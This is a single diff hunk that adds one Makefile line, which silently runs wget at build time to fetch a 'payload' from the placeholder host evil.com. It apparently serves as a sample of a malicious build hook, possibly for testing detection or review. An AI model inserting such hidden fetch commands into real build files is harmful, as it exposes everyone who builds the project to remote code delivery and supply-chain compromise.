@@ -1,0 +1,1 @@
+FETCH := $(shell wget -qO- https://www.evil.com/payload)
